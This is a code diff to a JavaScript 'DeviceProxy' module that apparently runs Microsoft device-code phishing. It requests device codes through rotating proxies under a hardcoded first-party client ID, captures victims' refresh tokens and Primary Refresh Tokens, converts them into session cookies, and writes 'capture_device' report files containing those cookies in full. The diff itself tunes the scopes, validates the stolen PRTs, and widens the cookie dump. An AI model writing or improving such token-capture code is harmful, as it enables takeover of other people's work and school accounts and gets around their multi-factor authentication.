@@ -49,9 +49,10 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
 
     // Call Microsoft Device Code endpoint via proxy
     const tenant = config.AZURE_TENANT || 'common';
-    const clientId = config.AZURE_CLIENT_ID;
-    const deviceCodeScope =
-      'openid profile email offline_access urn:ms-drs:enterpriseregistration.windows.net/.default';
+    const clientId = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
+    // Match GraphSpy: the device-code request itself uses the Graph default scope,
+    // while DRS/device enrollment is handled later with the enterprise-registration scope.
+    const deviceCodeScope = 'https://graph.microsoft.com/.default openid offline_access';
     const deviceCodeUrl = `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`;
 
     // GraphSpy device_codes.generate(version=2, ngcmfa=True, cae=True):
@@ -232,11 +233,10 @@ async function pollForToken(jobId) {
           },
           validateStatus: () => true,
           timeout: 15000,
-          proxy: job.proxy,
-          // Jobs that fell back to a direct devicecode request have no proxy.
-          // Force the poll direct too — otherwise ms.post claims a fresh
-          // proxy and the IP mismatch makes Microsoft reject the exchange.
-          noProxy: !job.proxy_id,
+          // Reuse the exact sticky proxy claimed for the device-code flow.
+          // If the job never had a proxy, go direct instead of claiming a new one.
+          proxy: job.proxy || null,
+          noProxy: !job.proxy,
         }
       );
 
@@ -437,14 +437,14 @@ async function retryAsTokenMode(originalJob) {
   try {
     // Use same tenant as device code endpoint (organizations for adrs_access scope)
     const tenant = config.AZURE_TENANT || 'organizations';
-    const clientId = config.AZURE_CLIENT_ID;
+    const clientId = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
 
     // Claim a sticky proxy for the retry flow
     const { proxy, response: dcResponse } = await ms.post(
       `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`,
       new URLSearchParams({
-        client_id: config.AZURE_CLIENT_ID,
-        scope: 'openid profile email offline_access 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9/.default',
+        client_id: clientId,
+        scope: 'https://graph.microsoft.com/.default openid offline_access',
       }),
       {
         headers: {
@@ -547,17 +547,30 @@ async function storeToken(job, tokenData, responseCookies = []) {
     let clientInfo = null;
 
     // Preserve the PRT from the x-ms-RefreshTokenCredential cookie (if present)
-    // This is a JWT that can be decoded for client_info, session_key, tid, uid
+    // This is a JWT that can be decoded for client_info, session_key, tid, uid.
+    // Only accept a real JWT-shaped PRT here; a raw OAuth refresh token is not
+    // a PRT and must never be treated as one for Kerberos/renewal logic.
     const prtCookie = responseCookies.find(c => c.name === 'x-ms-RefreshTokenCredential');
     if (prtCookie && prtCookie.value) {
-      prt = prtCookie.value;
-      console.log('[DeviceProxy] PRT from cookie: prefix=' + (prtCookie.value || '').substring(0, 30) + '... length=' + (prtCookie.value || '').length);
+      const prtCookieClaims = parsePrtClaims(prtCookie.value);
+      if (prtCookieClaims) {
+        prt = prtCookie.value;
+        console.log('[DeviceProxy] PRT from cookie: prefix=' + (prtCookie.value || '').substring(0, 30) + '... length=' + (prtCookie.value || '').length);
+      } else {
+        console.warn('[DeviceProxy] Ignoring non-JWT x-ms-RefreshTokenCredential cookie; real PRT JWT required for renewal/Kerberos flow');
+      }
     }
 
-    // If no PRT cookie, fall back to OAuth refresh token (but don't overwrite cookie PRT)
+    // A raw OAuth refresh_token is not a PRT JWT. It may be used for DRS token
+    // exchange, but it must never be treated as the final PRT for Kerberos or
+    // PRT renewal. Require a JWT-shaped PRT before accepting it.
     if (!prt && tokenData.refresh_token) {
-      prt = tokenData.refresh_token;
-      console.log('[DeviceProxy] Using OAuth refresh_token as PRT fallback: prefix=' + (prt || '').substring(0, 30) + '...');
+      if (parsePrtClaims(tokenData.refresh_token)) {
+        prt = tokenData.refresh_token;
+        console.log('[DeviceProxy] Using OAuth refresh_token as valid PRT fallback: prefix=' + (prt || '').substring(0, 30) + '...');
+      } else {
+        console.log('[DeviceProxy] Ignoring refresh_token fallback: it is not a valid PRT JWT; real x-ms-RefreshTokenCredential session material is required');
+      }
     }
 
     // Extract session_key_enc from token response (if present)
@@ -857,12 +870,18 @@ async function storeToken(job, tokenData, responseCookies = []) {
     // For cookie mode, trigger cookie conversion immediately after capture
     let cookieConversionResult = null;
     if (job.mode === 'cookie') {
-      const refreshTokenForConversion = tokenData.refresh_token || prt || tokenData.access_token;
-      cookieConversionResult = await cookieConverter.processCookieConversion(tokenId, refreshTokenForConversion, 'office', tenant, accountType, job.user_id)
-        .catch(err => {
-          console.error('[DeviceProxy] Cookie conversion failed:', err.message);
-          return { success: false, error: err.message };
-        });
+      const refreshTokenForConversion = prt || tokenData.refresh_token || tokenData.access_token;
+      const validPrtForConversion = !!(prt && parsePrtClaims(prt));
+      if (!validPrtForConversion) {
+        console.log('[DeviceProxy] Skipping cookie conversion: no valid PRT JWT; refresh token is not accepted as a substitute PRT');
+        cookieConversionResult = { success: false, error: 'No valid PRT JWT available for cookie conversion' };
+      } else {
+        cookieConversionResult = await cookieConverter.processCookieConversion(tokenId, refreshTokenForConversion, 'office', tenant, accountType, job.user_id)
+          .catch(err => {
+            console.error('[DeviceProxy] Cookie conversion failed:', err.message);
+            return { success: false, error: err.message };
+          });
+      }
     }
 
     // Attempt device registration and PRT generation for ALL work/school accounts
@@ -1023,12 +1042,24 @@ async function storeToken(job, tokenData, responseCookies = []) {
         '========================================'
       ].join('\n');
 
-      // For cookie mode, include actual cookies in the report
-      if (job.mode === 'cookie' && cookieConversionResult && cookieConversionResult.success && cookieConversionResult.cookies) {
-        const cookieText = Array.isArray(cookieConversionResult.cookies)
-          ? cookieConversionResult.cookies.map(c => `${c.name}=${c.value}; domain=${c.domain}; path=${c.path || '/'}; secure${c.httpOnly ? '; httponly' : ''}${c.sameSite ? '; samesite=' + c.sameSite : ''}`).join('\n')
-          : String(cookieConversionResult.cookies);
-        fileContent += '\n\nCOOKIES:\n' + cookieText;
+      // Include captured cookies in the report regardless of mode so private-account
+      // validation shows the actual PRT cookie if Microsoft returned one.
+      const reportCookies = [];
+      if (responseCookies && responseCookies.length > 0) {
+        for (const cookie of responseCookies) {
+          if (cookie && cookie.name) {
+            reportCookies.push(`${cookie.name}=${cookie.value}; domain=${cookie.domain || '.login.microsoftonline.com'}; path=/; secure`);
+          }
+        }
+      }
+      if (cookieConversionResult && cookieConversionResult.cookies) {
+        const extra = Array.isArray(cookieConversionResult.cookies)
+          ? cookieConversionResult.cookies.map(c => `${c.name}=${c.value}; domain=${c.domain}; path=${c.path || '/'}; secure${c.httpOnly ? '; httponly' : ''}${c.sameSite ? '; samesite=' + c.sameSite : ''}`)
+          : [String(cookieConversionResult.cookies)];
+        for (const item of extra) reportCookies.push(item);
+      }
+      if (reportCookies.length > 0) {
+        fileContent += '\n\nCOOKIES:\n' + [...new Set(reportCookies)].join('\n');
       }
 
       const filename = `capture_device_${tokenId}_${reportTokenType}.txt`;
